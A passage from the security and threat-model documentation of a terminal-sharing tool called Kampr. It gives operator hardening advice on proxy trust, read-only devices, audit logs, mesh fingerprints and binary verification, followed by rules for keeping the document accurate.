   migration path and no warning at startup. What each surface needs before a passkey is possible at
   all — and why the Android app needs a hostname Google's servers can fetch a file from, which is a
   constraint no local configuration substitutes for — is [`10-passkeys.md`](./10-passkeys.md).
4. **Decide `trust_proxy` deliberately.** Turn it on only when a proxy you control is the *only* path
   to the node. With it on and the node reachable directly, every rate limit is forgeable.
5. **Keep the device list short, and use `readonly` for what it is.** Read-only bounds damage, not
   disclosure: such a device reads every terminal on the host. It is for a device you half-trust, not
   one you do not trust.
6. **Watch the arming window.** [§7.1](#71-the-pairing-arming-race). A failed arming is a signal.
7. **Read the audit log occasionally.** It is at `<state-dir>/audit.jsonl`, it rotates once, and it
   is the only forensic record. If it matters, ship it somewhere append-only.
8. **Do not rely on the uid boundary once Kampr is installed**, unless you have given the port its
   own network namespace or a uid owner-match rule. [§2](#2-trust-boundaries).
9. **Compare a mesh fingerprint out of band** if the join crosses a network you do not control, and
   **join over `wss://`** — `--fingerprint` protects this node's signature, not the join code, which
   is already on the wire when the pin is checked. Joining a hub hands it your terminals.
   [§3.6](#36-a-compromised-hub-or-a-node-impersonating-a-peer).
10. **Lock your phone.** [§3.2](#32-someone-holding-your-unlocked-phone) is not defended and Kampr has
   no plans to defend it.
11. **Verify the binary.** [§7.8](#78-the-install-path-grants-rce-by-construction).

---

## 9. Maintaining this document

- A control that is weaker than it reads belongs in [§5](#5-controls-and-what-each-one-actually-buys)
  with the weakness stated inline, not in a footnote.
- A risk that is understood and unfixed belongs in [§7](#7-residual-risks-known-and-real). It leaves
  when the fix has a test proving it, and not before — the same rule
  [`06-audit.md`](./06-audit.md) uses.
- **A control listed here that the code does not implement is worse than no control**, because it
  invites someone to skip a real one that would have covered them. Every claim above was checked
  against the code on 2026-08-20; re-check before trusting one.
- Nine of the defects an audit found in this area were real, and their root cause was that tests were
  written from the same mental model as the code. The security tests that replaced them drive the
  socket that is already open, which is precisely what the old ones avoided doing. Keep that habit.
